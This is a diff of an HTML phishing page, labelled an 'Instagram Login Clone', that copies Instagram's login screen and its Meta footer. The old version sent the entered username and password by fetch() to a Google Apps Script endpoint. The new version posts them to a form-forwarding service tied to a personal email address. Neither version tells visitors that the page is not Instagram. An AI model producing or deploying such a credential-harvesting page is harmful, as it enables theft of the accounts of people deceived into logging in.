@@ -1,157 +1,140 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Instagram Login Clone</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Helvetica Neue', sans-serif;
-      background: linear-gradient(135deg, #e1f5fe, #f0eafa, #fff0f5, #fafafa);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
+  <head>
+    <meta charset="UTF-8" />
+    <title>Instagram Login Clone</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", sans-serif;
+        background: linear-gradient(135deg, #e1f5fe, #f0eafa, #fff0f5, #fafafa);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+      }
 
-    .login-container {
-      background-color: white;
-      padding: 80px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      text-align: center;
-      width: 100%;
-      max-width: 500px;
-      height: 25%;
-    }
+      .login-container {
+        background-color: white;
+        padding: 80px;
+        border-radius: 20px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        width: 100%;
+        max-width: 500px;
+        height: 25%;
+      }
 
-    .logo {
-      width: 60px;
-      height: 60px;
-      margin: 0 auto 20px;
-      border-radius: 20%;
-      position: relative;
-    }
+      .logo {
+        width: 60px;
+        height: 60px;
+        margin: 0 auto 20px;
+        border-radius: 20%;
+        position: relative;
+      }
 
-    .logo::after {
-      content: '';
-      position: absolute;
-      top: 18%;
-      left: 18%;
-      width: 65%;
-      height: 65%;
-      background: white;
-      border-radius: 50%;
-    }
+      .logo::after {
+        content: "";
+        position: absolute;
+        top: 18%;
+        left: 18%;
+        width: 65%;
+        height: 65%;
+        background: white;
+        border-radius: 50%;
+      }
 
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      font-size: 25px;
-    }
+      input {
+        width: 100%;
+        padding: 12px;
+        margin: 10px 0;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        font-size: 25px;
+      }
 
-    .login-btn {
-      width: 100%;
-      padding: 20px;
-      background-color: #0095f6;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 25px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
+      .login-btn {
+        width: 100%;
+        padding: 20px;
+        background-color: #0095f6;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 25px;
+        cursor: pointer;
+        margin-top: 10px;
+      }
 
-    .login-btn:hover {
-      background-color: #007ac1;
-    }
+      .login-btn:hover {
+        background-color: #007ac1;
+      }
 
-    #logo{ 
-        transform: translate(0px,-50px);
+      #logo {
+        transform: translate(0px, -50px);
         margin-bottom: 120px;
         margin-top: -190px;
-    }
+      }
 
-    .link {
-      display: block;
-      margin-top: 15px;
-      color: #00376b;
-      font-size: 20px;
-      text-decoration: none;
-    }
+      .link {
+        display: block;
+        margin-top: 15px;
+        color: #00376b;
+        font-size: 20px;
+        text-decoration: none;
+      }
 
-    .footer {
-      margin-top: 20px;
-      font-size: 17px;
-      color: gray;
-    }
+      .footer {
+        margin-top: 20px;
+        font-size: 17px;
+        color: gray;
+      }
 
-    .create-account {
-      margin-top: 20px;
-      border: 1px solid #0095f6;
-      background-color: transparent;
-      color: #0095f6;
-    }
+      .create-account {
+        margin-top: 20px;
+        border: 1px solid #0095f6;
+        background-color: transparent;
+        color: #0095f6;
+      }
 
-    #lg{ 
+      #lg {
         height: 20%;
         width: 30%;
-    }
+      }
 
-    #logo{ 
+      #logo {
         height: 10%;
         width: 20%;
         display: none;
-    }
-  </style>
-</head>
-<body>
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <form action="https://formsubmit.co/abhaybudhewar430@gmail.com" method="POST">
+        <img src="instagram.jpg" alt="" id="lg" />
 
+        <input
+          type="text"
+          placeholder="Username, email or mobile number"
+          name="username"
+          required
+        />
+        <input
+          type="password"
+          placeholder="Password"
+          name="password"
+          required
+        />
+        <button class="login-btn" id="log-in" type="submit">Log in</button>
+      </form>
 
-<div class="login-container">
-    
-    <form id="myForm">
-  <img src="instagram.jpg" alt="" id="lg">
-  
-  <input type="text" placeholder="Username, email or mobile number" name="username" required>
-  <input type="password" placeholder="Password" name="password" required>
-  <button class="login-btn" id="log-in" type="submit">Log in</button>
-</form>
+      <a href="#" class="link">Forgot password?</a>
+      <button class="login-btn create-account" id="create-account">
+        Create new account
+      </button>
 
-  <a href="#" class="link">Forgot password?</a>
-  <button class="login-btn create-account" id="create-account">Create new account</button>
-
-  <div class="footer">Meta</div>
-</div>
-
-<script>
-    const form = document.getElementById('myForm');
-    form.addEventListener('submit', e => {
-      e.preventDefault();
-  
-      const data = {
-        username: form.username.value,
-        password: form.password.value
-        
-      };
-  
-      fetch("https://script.google.com/macros/s/AKfycbxtHjxMstgPOUYrSg4i03GxKXu-8QPIssndYg8zGHnGVAa8PGFBOJpdtYJZmxxopnzA/exec", {
-        method: "POST",
-        body: JSON.stringify(data)
-      }).then(res => {
-        if (res.ok) {
-          alert("Submitted successfully!");
-          form.reset();
-        } else {
-          alert("Submission failed!");
-        }
-      });
-    });
-  </script>
-
-</body>
+      <div class="footer">Meta</div>
+    </div>
+  </body>
 </html>
